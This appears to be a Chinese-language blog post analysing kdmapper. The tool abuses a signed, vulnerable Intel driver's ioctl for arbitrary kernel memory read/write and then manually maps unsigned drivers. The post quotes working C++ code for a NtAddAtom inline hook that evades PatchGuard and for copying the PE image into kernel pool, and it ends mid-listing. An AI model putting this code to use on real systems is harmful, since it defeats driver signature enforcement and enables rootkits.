&lt;p&gt;kdmapper通过加载有签名的漏洞驱动并利用漏洞来实现加载未签名驱动的功能。漏洞的位置位于驱动ioctl处理函数中，驱动在初始化过程中注册了ioctl处理函数并在控制码为0x80862007的对应函数中提供了任意地址读写、获取物理地址、映射任意地址等功能&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210719111311394.png&quot; alt=&quot;image-20210719111311394&quot; /&gt;&lt;/p&gt;

&lt;p&gt;映射地址功能&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210719111346099.png&quot; alt=&quot;image-20210719111346099&quot; /&gt;&lt;/p&gt;

&lt;p&gt;获取物理地址&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210719111406927.png&quot; alt=&quot;image-20210719111406927&quot; /&gt;&lt;/p&gt;

&lt;p&gt;任意地址读写&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210719111433722.png&quot; alt=&quot;image-20210719111433722&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;从任意地址写到代码执行&quot;&gt;从任意地址写到代码执行&lt;/h2&gt;

&lt;p&gt;由于漏洞驱动提供了获取物理地址以及映射物理地址的功能，因此kdmapper可以使用映射物理地址的方式读写被保护的内存，通过对内核函数进行inline hook的方法进行劫持实现任意代码执行。&lt;/p&gt;

&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;		&lt;span class=&quot;c1&quot;&gt;//获取r3 NtAddAtom地址&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;HMODULE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ntdll&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GetModuleHandleA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ntdll.dll&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

		&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;auto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NtAddAtom&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;reinterpret_cast&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetProcAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ntdll&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;NtAddAtom&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

		&lt;span class=&quot;c1&quot;&gt;//inline hook 使用的跳转代码&lt;/span&gt;
		&lt;span class=&quot;kt&quot;&gt;uint8_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kernel_injected_jmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x48&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xb8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xe0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
		&lt;span class=&quot;kt&quot;&gt;uint8_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;original_kernel_function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kernel_injected_jmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)];&lt;/span&gt;
		&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kernel_injected_jmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kernel_function_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		
		&lt;span class=&quot;c1&quot;&gt;//获取r0 NtAddAtom地址&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kernel_NtAddAtom&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GetKernelModuleExport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;device_handle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;intel_driver&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ntoskrnlAddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;NtAddAtom&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;


		&lt;span class=&quot;c1&quot;&gt;// Overwrite the pointer with kernel_function_address&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;WriteToReadOnlyMemory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;device_handle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kernel_NtAddAtom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kernel_injected_jmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kernel_injected_jmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

		&lt;span class=&quot;c1&quot;&gt;// Call function&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;constexpr&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;call_void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;using&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FunctionFn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;T&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__stdcall&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...);&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;auto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Function&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;reinterpret_cast&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FunctionFn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NtAddAtom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

			&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;out_result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arguments&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...);&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;using&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FunctionFn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__stdcall&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...);&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;auto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Function&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;reinterpret_cast&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FunctionFn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NtAddAtom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

			&lt;span class=&quot;n&quot;&gt;Function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arguments&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...);&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

		&lt;span class=&quot;c1&quot;&gt;// Restore the pointer/jmp&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;WriteToReadOnlyMemory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;device_handle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kernel_NtAddAtom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;original_kernel_function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kernel_injected_jmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在inlinehook函数之后，通过在r3调用NtAddAtom触发inline hook。为了避免被PG检测到，在调用完成后立即恢复原函数&lt;/p&gt;

&lt;h2 id=&quot;内存加载驱动&quot;&gt;内存加载驱动&lt;/h2&gt;

&lt;p&gt;驱动文件同样是PE结构的文件，因此内存加载方式几乎一样，在处理完导入表和重定位后，三环程序通过漏洞驱动将驱动镜像写入到分配好的内核地址中，接着调用驱动的入口函数完成驱动的加载。&lt;/p&gt;

&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vector&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint8_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;raw_image&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;utils&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ReadFileToMemory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;driver_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;raw_image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;Log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;L&quot;[-] Failed to read image to memory&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PIMAGE_NT_HEADERS64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nt_headers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;portable_executable&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetNtHeaders&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;raw_image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;image_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nt_headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OptionalHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SizeOfImage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_image_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;VirtualAlloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;nullptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;image_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MEM_RESERVE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MEM_COMMIT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PAGE_READWRITE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_image_base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TotalVirtualHeaderSize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IMAGE_FIRST_SECTION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nt_headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;VirtualAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kernel_image_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;intel_driver&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AllocatePool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iqvw64e_device_handle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;POOL_TYPE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NonPagedPool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;image_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;destroyHeader&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TotalVirtualHeaderSize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;c1&quot;&gt;// Copy image headers&lt;/span&gt;

		&lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_image_base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;raw_image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nt_headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OptionalHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SizeOfHeaders&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

		&lt;span class=&quot;c1&quot;&gt;// Copy image sections&lt;/span&gt;

		&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PIMAGE_SECTION_HEADER&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_image_section&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IMAGE_FIRST_SECTION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nt_headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

		&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;auto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nt_headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FileHeader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NumberOfSections&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;auto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_section&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;reinterpret_cast&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;reinterpret_cast&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_image_base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_image_section&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;VirtualAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_section&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;reinterpret_cast&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;reinterpret_cast&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;raw_image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_image_section&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PointerToRawData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_image_section&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SizeOfRawData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

